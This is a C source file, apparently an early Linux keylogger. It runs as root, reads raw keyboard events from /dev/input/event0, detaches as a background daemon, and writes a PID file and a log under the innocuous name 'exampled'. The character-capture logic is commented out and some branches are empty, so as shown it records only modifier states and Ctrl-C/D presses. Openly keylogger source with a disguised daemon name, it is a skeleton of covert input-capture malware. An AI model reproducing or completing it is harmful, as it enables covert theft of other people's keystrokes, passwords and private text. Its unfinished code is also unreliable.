/*
 * keyLog.c
 *
 *
 * By: Eivind Bergman
 * Date: 2019-02-04
 */
#include "stdio.h"
#include "stdlib.h"
#include "stdbool.h"
#include "sys/stat.h"
#include "sys/types.h"
#include "sys/time.h"
#include "sys/file.h"
#include "sys/wait.h"
#include "signal.h"
#include "unistd.h"
#include "syslog.h"
#include "getopt.h"
#include "string.h"
#include "fcntl.h"
#include "time.h"
#include "errno.h"
#include "error.h"
#include "linux/input.h"


#define EV_RELEASED 0
#define EV_PRESSED 1
#define EV_REPEAT 2

#define INPUT_EVENT_DIR "/dev/input/"

#define PID_FILE "/var/run/exampled.pid"
#define LOG_FILE "/var/log/exampled.log"


// input event device file descriptor; global so that signal_handler() can access it
int input_fd = -1;

void log_message(char *filename, char *message) {
    FILE *logfile;

    char timestamp[32];
    
    time_t cur_time;
    time(&cur_time);
    strftime(timestamp, sizeof(timestamp), "%F %T", localtime(&cur_time));

    char message_with_timestamp[200];//(int) sizeof(message) + (int) sizeof(timestamp)];

    snprintf(message_with_timestamp, sizeof(message_with_timestamp), "[%s] %s", timestamp, message);
	logfile=fopen(filename, "a");
	fprintf(logfile,"%s\n",message_with_timestamp);
	fclose(logfile);
}

void signal_handler(int sig) {
    // closing input file will break the infinite while loop
    if (sig == SIGTERM) {
        if (input_fd != -1)
            close(input_fd);
    }
}

void set_signal_handling() {
    signal(SIGCHLD,SIG_IGN); /* ignore child */
	signal(SIGTSTP,SIG_IGN); /* ignore tty signals */
	signal(SIGTTOU,SIG_IGN);
	signal(SIGTTIN,SIG_IGN);
	signal(SIGHUP,signal_handler); /* catch hangup signal */
    signal(SIGTERM,signal_handler); /* catch kill signal */
}

void kill_process() {
    pid_t pid;
    bool file = true;

    FILE *tmp_file = fopen(PID_FILE, "r");
    
    file &= (tmp_file != NULL);

    if (file) {
        file &= (fscanf(tmp_file, "%d", &pid) == 1);
        fclose(tmp_file);
    }

    if (file) {
        remove(PID_FILE);
        kill(pid, SIGINT);
        error(EXIT_SUCCESS, 0, "Successfully killed process.");
    } 
    error(EXIT_FAILURE, 0, "No process killed");
}

void create_pid() {
    int pid_fd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0640);
    if (pid_fd != -1) {
        char pid_str[16] = {0};
        sprintf(pid_str, "%d", getpid());
        if (write(pid_fd, pid_str, strlen(pid_str)) == -1) {
            error(EXIT_FAILURE, errno, "Error writing pid file");
        }
        close(pid_fd);
    } else {
        error(EXIT_FAILURE, errno, "Error opening pid file");
    }
}


int main() {

    if (geteuid()) 
        error(EXIT_FAILURE, errno, "Got r00t?");

    if (access(PID_FILE, F_OK) != -1)  // PID file already exists
        error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");

    input_fd = open("/dev/input/event0", O_RDONLY);
    if (input_fd == -1)
        error(EXIT_FAILURE, errno, "Error opening input event device '%s'", INPUT_EVENT_DIR);


    set_signal_handling();


    // open log file (if file doesn't exist, create it with safe 0600 permissions)
    umask(0177);
    FILE *out = NULL;
    out = fopen(LOG_FILE, "a");

    if (!out)
        error(EXIT_FAILURE, errno, "Error opening output file '%s'", LOG_FILE);



    if (daemon(0, 1) == -1)  // become daemon
        error(EXIT_FAILURE, errno, "Failed to become daemon");

    printf("Creating pid\n");
    create_pid();


    unsigned int scan_code, prev_code = 0;
    struct input_event event;
    
    bool caps_in_effect = false;
    bool shift_in_effect = false;
    bool altgr_in_effect = false;
    bool ctrl_in_effect = false;

    int repeats = 0;

    log_message(LOG_FILE, "Setup complete, starting to listen now.");
    
    while(read(input_fd, &event, sizeof(struct input_event)) > 0) {

        if (event.type != EV_KEY) 
            continue;

        scan_code = event.code;

        if (event.value == EV_REPEAT) {
            ++repeats;
        } else if (repeats) {
            if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL ||
                prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  ||
                prev_code == KEY_LEFTSHIFT || prev_code == KEY_RIGHTCTRL) {
            }
            else {
                // Log repeats
            }
            repeats = 0;
        }

        // On key press
        if (event.value == EV_PRESSED) {

            // Is enter or ctrl-C/D pressed?
            if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER || 
                    (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
                if (ctrl_in_effect) {
                    log_message(LOG_FILE, "Ctrl C or D");
                    // Log C or D
                }
                goto end;
            }

            if (scan_code == KEY_CAPSLOCK)
                caps_in_effect = !caps_in_effect;
            if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
                shift_in_effect = true;
            if (scan_code == KEY_RIGHTALT)
                altgr_in_effect = true;
            if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
                ctrl_in_effect = true;

            //if (is_char_key(scan_code)) {
            //    wchar_t wchar;
            //    if (altgr_in_effect) {
            //        wchar = altgr_keys[ ]
            //    }
            //}
            


        } // if (event.value == EV_MAKE) end
        
        if (event.value == EV_RELEASED) {
            if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT) {
                shift_in_effect = false;
            }
            if (scan_code == KEY_RIGHTALT) {
                altgr_in_effect = false;
            }
            if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL) {
                ctrl_in_effect = false;
            }
        }
        end:
        prev_code = scan_code;

    }
    log_message(LOG_FILE, "Received Signal, shutting down gracefully.");
    remove(PID_FILE);
    exit(EXIT_SUCCESS);
}
